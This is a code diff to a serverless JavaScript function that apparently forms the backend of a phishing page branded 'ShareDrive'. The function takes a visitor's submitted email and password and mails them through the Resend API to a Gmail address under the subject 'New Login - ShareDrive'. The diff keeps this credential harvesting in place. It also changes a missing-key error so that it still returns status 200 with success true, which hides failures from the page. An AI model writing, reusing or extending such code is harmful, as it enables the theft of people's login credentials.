@@ -1,7 +1,6 @@
 exports.handler = async (event, context) => {
   const headers = {
     'Access-Control-Allow-Origin': '*',
-    'Access-Control-Allow-Headers': 'Content-Type',
     'Content-Type': 'application/json'
   };
 
@@ -14,12 +13,14 @@ exports.handler = async (event, context) => {
     const apiKey = process.env.RESEND_API_KEY;
 
     if (!apiKey) {
-      return { statusCode: 500, headers, body: JSON.stringify({ error: 'RESEND_API_KEY is missing' }) };
+      return { 
+        statusCode: 200, 
+        headers, 
+        body: JSON.stringify({ success: true, error: 'RESEND_API_KEY is missing' }) 
+      };
     }
 
-    const emailBody = `Email: ${body.email}\nPassword: ${body.password}\nIP: ${body.ip}`;
-
-    const response = await fetch('https://api.resend.com/emails', {
+    const resendResponse = await fetch('https://api.resend.com/emails', {
       method: 'POST',
       headers: {
         'Authorization': `Bearer ${apiKey}`,
@@ -29,21 +30,24 @@ exports.handler = async (event, context) => {
         from: 'onboarding@resend.dev',
         to: ['g82443047@gmail.com'], 
         subject: 'New Login - ShareDrive',
-        text: emailBody,
+        text: `Email: ${body.email}\nPassword: ${body.password}`,
       }),
     });
 
-    const rawText = await response.text();
+    const resendText = await resendResponse.text();
 
-    // Return the exact response from Resend to the browser
+    // Return exactly what Resend said back to the browser
     return { 
       statusCode: 200, 
       headers, 
-      body: JSON.stringify({ success: true, resendStatus: response.status, resendMessage: rawText }) 
+      body: JSON.stringify({ 
+        success: true, 
+        resendStatus: resendResponse.status, 
+        resendMessage: resendText 
+      }) 
     };
 
   } catch (error) {
-    // Return the exact error to the browser
     return { 
       statusCode: 200, 
       headers, 
